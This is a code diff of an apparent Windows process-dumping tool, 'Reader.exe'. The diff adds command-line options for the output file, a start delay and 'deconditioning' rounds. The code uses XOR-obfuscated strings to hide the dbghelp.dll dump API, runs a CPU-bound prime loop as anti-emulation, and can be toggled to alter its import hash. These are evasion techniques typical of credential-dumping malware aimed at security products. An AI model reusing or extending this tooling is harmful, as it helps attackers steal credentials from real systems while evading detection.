@@ -7,10 +7,11 @@
 
 #pragma comment(lib, "dbghelp.lib")
 
-#if TRUE // toggle this to change IMPHASH
+//#define CHANGE_IMPHASH // comment this to change IMPHASH
+#if defined CHANGE_IMPHASH
 #include <fstream>
 void test() {
-    std::ofstream out("test.txt");
+    std::ofstream out("this-is-just-a-test.txt");
     out << "Test";
     out.close();
 }
@@ -26,24 +27,47 @@ typedef BOOL(WINAPI* MyDumpPtr)(
     PVOID         CallbackParam
     );
 
-int main(int argc, char** argv) {
-    int deconDumps = 0;
-    if (argc >= 2) {
-        deconDumps = atoi(argv[1]);
+void printHelp() {
+    std::cout << "Usage: Reader.exe [outFile.dmp] [n sec start delay] [n deconRounds]\n";
+    exit(1);
+}
+
+int main(int argc, char* argv[]) {
+    if (argc < 4) {
+        printHelp();
     }
+    char* outFile = argv[1];
+    INT64 delay = atoll(argv[2]);
+    int deconDumps = atoi(argv[3]);
 
     std::cout << "Reader started with PID=" << GetCurrentProcessId() << ", doing " << deconDumps << " deconditioning rounds\n";
 
-    // antiEmulation should be one of the first actions in the EXE
-    std::cout << "Doing anti emulation calc operations for about 5 sec\n";
+    if (delay > 0) {
+        // antiEmulation should be one of the first actions in the EXE
+        std::cout << "Doing anti emulation calc operations for about " << delay << " sec\n";
 
-    auto start_ae_calc = std::chrono::high_resolution_clock::now();
-    volatile bool dummy_ae_calc; // do no optimze "calc prime" loop away
-    for (UINT64 n = 2; n <= 15'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_ae_calc = pr; }
-    auto end_ae_calc = std::chrono::high_resolution_clock::now();
-    auto ae_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_calc - start_ae_calc).count();
+        auto start_ae_calc = std::chrono::high_resolution_clock::now();
+        volatile bool dummy_ae_calc; // do no optimze "calc prime" loop away
+        INT64 steps = 0;
+        for (INT64 n = 2; n < LLONG_MAX; ++n) { 
+            bool pr = true; 
+            INT64 i = 2;
+            for (; i * i <= n; ++i) { 
+                if (n % i == 0) {
+                    pr = false; break;
+                }
+            }
+            steps += i;
+            dummy_ae_calc = pr;
+            if (steps > 600'000'000LL * delay) {
+                break;
+            }
+        }
+        auto end_ae_calc = std::chrono::high_resolution_clock::now();
+        auto ae_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_calc - start_ae_calc).count();
 
-    std::cout << "Calculated for approximately " << ae_calc_elapsed << " ms\n";
+        std::cout << "Calculated for approximately " << ae_calc_elapsed << " ms\n";
+    }
 
     std::cout << "Before creating proc snapshot\n";
 
@@ -62,10 +86,6 @@ int main(int argc, char** argv) {
     // init strings
     std::cout << "Before decrypting strings\n";
 
-    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=QzpcXFVzZXJzXFxQdWJsaWNcXERvd25sb2Fkc1xcdGVzdC5kbXBcMA
-    BYTE outFileBytes[] = { 0x02,0x78,0x1d,0x17,0x32,0x27,0x33,0x31,0x1d,0x12,0x34,0x20,0x2d,0x2b,0x22,0x1e,0x05,0x2d,0x36,0x2c,0x2d,0x2d,0x20,0x26,0x32,0x1e,0x25,0x6c,0x25,0x2f,0x31,0x42 };
-    for (size_t i = 0; i < sizeof(outFileBytes); ++i) { outFileBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
-
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
     BYTE dumpLibraryBytes[] = { 0x25,0x20,0x26,0x2a,0x24,0x2e,0x31,0x6c,0x25,0x2e,0x2d,0x42 };
     for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
@@ -76,11 +96,10 @@ int main(int argc, char** argv) {
 
     std::cout << "After decrypting strings\n";
 
-    char* outFile = reinterpret_cast<char*>(outFileBytes);
     char* dumpLibrary = reinterpret_cast<char*>(dumpLibraryBytes);
     char* dumpFunction = reinterpret_cast<char*>(dumpFunctionBytes);
 
-    std::cout << "Before opening out file\n";
+    std::cout << "Before opening out file " << outFile << "\n";
 
     // open handle to dump file (overwrite if exists)
     HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
